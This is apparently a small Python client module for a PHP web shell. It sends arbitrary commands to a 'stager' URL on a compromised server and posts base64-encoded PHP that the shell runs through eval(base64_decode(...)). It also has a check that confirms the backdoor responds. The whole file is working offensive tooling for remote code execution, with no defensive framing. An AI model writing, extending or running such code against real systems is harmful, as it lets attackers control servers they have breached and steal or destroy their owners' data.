import requests
import base64

from . import util


def execute_command(stager_url: str, command: str, post: bool = False, param: str = 'c') -> str:
    if not command.endswith(';'):
        command += ';'

    r = requests.get(stager_url, params={param: command})
    return r.text


def execute_payload(stager_url: str, payload: str, get_param: str = 'c', post_param: str = 'd') -> str:
    r = requests.post(stager_url, params={get_param: f"eval(base64_decode($_POST['{post_param}']));"},
                      data={post_param: base64.b64encode(payload.encode())})
    return r.text


def perform_basic_tests(stager_url: str) -> bool:
    token = util.random_string(15)
    if execute_command(stager_url, f'echo "{token}"') != token:
        return False

    # Add more eventual tests further on

    return True
